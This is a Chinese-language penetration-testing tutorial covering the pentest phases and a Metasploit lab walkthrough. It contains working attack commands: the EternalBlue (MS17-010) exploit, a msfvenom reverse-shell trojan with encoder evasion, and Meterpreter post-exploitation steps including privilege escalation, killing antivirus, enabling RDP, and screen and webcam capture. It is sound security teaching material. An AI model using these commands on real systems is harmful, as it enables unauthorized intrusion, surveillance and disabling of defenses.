# 一、阶段划分：

漏洞利用分为 :

1. 前期交互
2. 情报搜集
3. 威胁建模
4. 漏洞分析
5. 渗透利用
6. 后渗透利用
7. 报告

## 1.前期交互阶段：

与客户组织进行交互讨论，确定范围，目标等

         这个阶段大家可以理解为情报收集前阶段，主要是为了找到目标 确认范围

![](https://cdn.jsdelivr.net/gh/wangyuhubugui/BJYH_picture@main/img/1643165117094.png#id=QqFmp&originHeight=444&originWidth=973&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

## 2.情报搜集阶段：

获取更多目标组织信息，

|          外围信息搜索   -    Google

![](https://cdn.jsdelivr.net/gh/wangyuhubugui/BJYH_picture@main/img/1643165139006.png#id=vsLuH&originHeight=509&originWidth=908&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

          **主机探测与端口扫描: **        如 -Nmap

           **服务扫描: **      利用metasploit中的auxiliary/scanner/中的服务扫描模块，可以对靶机中的服务版本等信息进行扫描

            **网络漏洞扫描:**   -OpenVAS、Nessus等

             **其他工具扫描: **  py脚本扫描

## 3.威胁建模阶段：

理清头绪，确定出最可行的漏洞利用通道，这个建模阶段写的文档不是给自己看的 是给整个团队看的 方便多人合作

![](https://cdn.jsdelivr.net/gh/wangyuhubugui/BJYH_picture@main/img/1643165166875.png#id=LPV7Q&originHeight=332&originWidth=629&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

           这个阶段主要是根据收集到的情报进行整理 ，理清漏洞利用思路。

## 4.漏洞分析阶段：

搜索可获取的渗透代码资源

![](https://cdn.jsdelivr.net/gh/wangyuhubugui/BJYH_picture@main/img/1643165182827.png#id=QIfJD&originHeight=379&originWidth=987&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

           这个阶段主要 挑选匹配可能存在的漏洞利用模块，shellcode

## 5.渗透利用阶段：

找出安全漏洞，入侵系统

          这个阶段尝试利用漏洞 ，配置监控，开始漏洞利用

## 6.后渗透利用阶段：

Meterpreter，实施操作

            这个阶段 就开始实施相关数据下载 后门维持  提权等操作

## 7.报告阶段：

漏洞利用渗透测试报告  （详细报告编写看 渗透测试报告课程）

![](https://cdn.jsdelivr.net/gh/wangyuhubugui/BJYH_picture@main/img/1643165204135.png#id=ljr6V&originHeight=345&originWidth=977&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

|             这个阶段主要是对本次渗透进行总结，概述总体上包括 时间、人员、漏洞利用范围、技术手段等等。我们需要在这部分确定漏洞利用执行的时间范围、参与漏洞利用的人员及联系方式、约定的漏洞利用范围和一些漏洞利用过程中采用的技术、工具描述。写清  前期交互   情报搜集 威胁建模  漏洞分析  .渗透利用  后渗透利用  漏洞利用结果 安全建议 等内容

在撰写的过程中，需要特别注意的是：漏洞描述切忌不可过于简单，一笔带过；在安全建议部分避免提出没有实际意义的安全建议，比如加强安全意识；报告结构混乱不堪，太多复杂的专业术语，比如绕狗、x站等等；

# 二、实际操作（永恒之蓝）

主机范围和目标已确定
1.在终端输入: 打开msf
```markdown
msfconsole
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1673623395475-b61e4344-2c22-4e02-8273-2c99aaa8006e.png#averageHue=%23050302&clientId=uf8d6c415-56f8-4&from=paste&height=444&id=uefeab94e&originHeight=499&originWidth=563&originalType=binary&ratio=1&rotation=0&showTitle=false&size=25387&status=done&style=none&taskId=u7e7e5ef7-5dd5-4757-a9cf-5bf7650f10b&title=&width=500.44444444444446)

## 情报搜集
msf终端内输入:
```
 search scanner type:auxiliary
```
> 此时看到可以用的很多的模块
> ![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1673623855730-efc668c4-9d5f-4391-b5e7-4664ac5a30b0.png#averageHue=%230d0b08&clientId=uf8d6c415-56f8-4&from=paste&height=278&id=u4a77a6df&originHeight=313&originWidth=451&originalType=binary&ratio=1&rotation=0&showTitle=false&size=27113&status=done&style=none&taskId=u30312a38-5bd1-4ea9-b7c4-f7073f535b4&title=&width=400.8888888888889)


### 可用于发现主机的模块
```markdown
auxiliary/scanner/discovery/arp_sweep # 基于ARP发现内网存活主机

auxiliary/scanner/discovery/udp_sweep # 基于UDP发现内网存活主机

auxiliary/scanner/ftp/ftp_version # 发现FTP服务

auxiliary/scanner/http/http_version # 发现HTTP服务

auxiliary/scanner/smb/smb_version # 基于smb发现内网存活主机

基于netbios发现内网存活主机

基于snmap发现内网存活主机

基于ICMP发现内网存活主机
```

### 模块的使用
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1673624421797-797bf6d7-810b-451f-94f9-4a4ae4eaa072.png#averageHue=%230c0b0b&clientId=uf8d6c415-56f8-4&from=paste&height=84&id=qdKOA&originHeight=94&originWidth=969&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5786&status=done&style=none&taskId=ufbfd15fd-0bf7-4d0c-9cb1-979ad3f3f99&title=&width=861.3333333333334)
举例:
```markdown
# 查看某个模块的信息
info 模块前的编号

# 使用模块有两种方式
# 方式1
use 模块编号

# 方式2
use 模块名称

# 直接输入options , 可以查看有哪些参数可以配置

```

方法1
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1673624536381-ac23f27e-6c6f-4157-8fa9-77124e3af10a.png#averageHue=%23080504&clientId=uf8d6c415-56f8-4&from=paste&height=239&id=Gu7o1&originHeight=269&originWidth=543&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17741&status=done&style=none&taskId=ubf4e8a42-6166-466e-8b84-5451be106bd&title=&width=482.6666666666667)

方法2
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1673625076034-cb9f02e8-f905-47bb-9f89-8e960eb64a9b.png#averageHue=%230b0504&clientId=uf8d6c415-56f8-4&from=paste&height=68&id=TTlsB&originHeight=77&originWidth=844&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8216&status=done&style=none&taskId=ucbbdb94e-3624-424f-a40a-13e1f9c47d4&title=&width=750.2222222222222)

参数配置:
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1673625256753-8ccc1fe7-4fe3-4317-8d08-b4b66b36371f.png#averageHue=%230b0807&clientId=uf8d6c415-56f8-4&from=paste&height=279&id=KkZ9p&originHeight=314&originWidth=712&originalType=binary&ratio=1&rotation=0&showTitle=false&size=29302&status=done&style=none&taskId=ue1501f21-7c75-4e61-8675-1845b91ff1b&title=&width=632.8888888888889)

# 开始收集
在msf中使用多种模块, 来查看有哪些主机
```markdown
# 使用模块
use 辅助模块名

# 查看参数
options

# 设置参数
set rhosts 攻击机的i尝试

# 对发现的主机, 进行一些漏洞发现,例如:
发现smb漏洞.


```

![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1673657824062-8b76709e-e8ed-4394-a8b7-d90554ca9929.png#averageHue=%230a0706&clientId=uf8d6c415-56f8-4&from=paste&height=27&id=uae115f93&originHeight=30&originWidth=718&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2904&status=done&style=none&taskId=u30f7c24b-c641-4ff8-b559-d809a5f25a8&title=&width=638.2222222222222)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1673657859298-3701339c-437e-4684-a2a0-74ede8399fa1.png#averageHue=%23060403&clientId=uf8d6c415-56f8-4&from=paste&height=239&id=u49a60c14&originHeight=269&originWidth=889&originalType=binary&ratio=1&rotation=0&showTitle=false&size=20867&status=done&style=none&taskId=ue0c9f3cd-a176-418a-b538-ba306924ceb&title=&width=790.2222222222222)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1673657894831-772fb8e1-9121-41e8-926d-8a91e8ec079e.png#averageHue=%230b0605&clientId=uf8d6c415-56f8-4&from=paste&height=127&id=u4907b551&originHeight=143&originWidth=661&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14659&status=done&style=none&taskId=u9298d59b-dd5c-4067-ac25-8343f98164f&title=&width=587.5555555555555)

> 在比如: 这个就有漏洞

![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1673658363034-b2a679b0-45b5-4cb7-9a2d-f73b857838f8.png#averageHue=%233a3e44&clientId=uf8d6c415-56f8-4&from=paste&height=310&id=u4c056429&originHeight=349&originWidth=1081&originalType=binary&ratio=1&rotation=0&showTitle=false&size=347824&status=done&style=none&taskId=u6b50da44-3c66-468a-805b-52d438876a1&title=&width=961)

## 威胁建模

---

经过第一步情报收集 我们通过arp发现了 目标机器ip
然后通过对目标机器的ip扫描 , 我们知道了目标机器开通了 80端口 ,  有web服务 ,开了ftp端口,   还有有文件服务, 开了 smb.

最终决定对smb相关的漏洞进行利用

备选方案通过植入木马的方式进行利用

---

## 漏洞分析

第一步先查看smb利用漏洞有哪些 比如**永恒之蓝**
1 查询msf与永恒之蓝相关的 模块
输入命令   :
```
search ms17_010
```

2 然后我们利用了一个永恒之蓝的 扫描模块

```
use auxiliary/scanner/smb/smb_ms17_010
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1673625636471-cdc66072-34fa-4869-814c-680c343988fa.png#averageHue=%23120f0d&clientId=uf8d6c415-56f8-4&from=paste&height=219&id=u93ea14d5&originHeight=246&originWidth=693&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30801&status=done&style=none&taskId=ub9c61e4a-91a8-4dd2-8213-ec26c797533&title=&width=616)


3 查看扫描模块需要配置的参数
```markdown
# 输入
options
```

3.1 然后我们配置了rhost  （rhost指的是目标主机ip）
```markdown
set rhosts 目标主机的ip


# 注意:
本次用的目标主机的ip是和攻击机同样网段(前三组数字相同)的随便写的ip

```

然后我们执行扫描 输入:
```
run
```

发现了 可能存在漏洞的主机

## 渗透利用

---

1 加载 永恒之蓝漏洞利用模块
```
use exploit/windows/smb/ms17_010_eternalblue
```

2  输入  
```markdown
options
```
  查看扫描模块需要配置的参数

3.1 然后我们配置了rhost  （rhost指的是目标主机ip）
```
set rhost   ip

# 注意:
lhost 指的是攻击机.(监控主机的iP )
lport 指的是攻击机的端口(监控的端口 )  (如果没有给配置,需要配置一下)
```

**注意: 端口必须没有被占用**
> 或者

```markdown
# 在msf下输入:
use /exploit/multi/handler

# 然后查看当前模块端口的默认是指,直接使用默认的就行, 输入:
options

```
然后我们执行扫描 输入:
```
  run 
```
开始,执行永恒之蓝漏洞利用啦

但是发现失败  提示 模块已经利用了  但是没有返回对应 session

![](https://cdn.jsdelivr.net/gh/wangyuhubugui/BJYH_picture@main/img/bffdb79061ad4b0aa92d2dfde83e9f1b.png#id=rU3M9&originHeight=127&originWidth=1045&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

备选方案通过植入木马的方式进行利用

---

我们知道目标机器是win系统  所以使用msfvenom  生成一个win平台的木马
就是一个(payload)
> 只需更换**LHOST**和 **LPORT**就行

```
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp

LHOST=192.168.3.33 LPORT=4446 -e x86/shikata_ga_nai -b '\x00\x0a\xff' -i 10  -f exe -o payload.exe
```

漏洞生成后  通过启动一个py服务将木马上传到目标机器
```
python -m SimpleHTTPServer 80
```

配置监控程序我们使用了
```
use exploit/multi/handler
```

3 输入 options进入配置

```
# 输入
options

# 然后我们配置了  lhost （lhost指的是  监控主机或攻击机 ip）

set lhost 攻击机的ip

# 然后我们配置了 lport  （指的是监控的端口 ）

set lport 攻击机的端口
```

**注意: 端口必须和msfvenom 生成的木马端口一样才行**

配置攻击载荷 payload

```
set payload windows/meterpreter/reverse_tcp
```
> 这里的payload , 就是生成木马的时候 -p 对应的东西.


执行利用等待目标机器执行木马

目标机器执行了木马

利用成功并获得meterpreter

---

# 后渗透利用
```markdown
# 查看进程
ps

# 查看当前进程号
getpid

# 查看系统信息
sysinfo

# 查看目标机是否为虚拟机
run post/windows/gather/checkvm

# 查看完整网络设置
route

# 查看当前权限
getuid

# 自动提权：
getsystem

# 关闭杀毒软件
run post/windows/manage/killav

# 启动远程桌面协议
run post/windows/manage/enable_rdp

# 列举当前登录的用户：
run post/windows/gather/enum_logged_on_users

# 查看当前应用程序
run post/windows/gather/enum_applications

# 抓取目标机的屏幕截图
load espia ； screengrab

# 抓取摄像头的照片
webcam_snap

# 查看当前处于目标机的那个目录
pwd

# 查看当前目录
getlwd
```

# 报告阶段
> 暂略

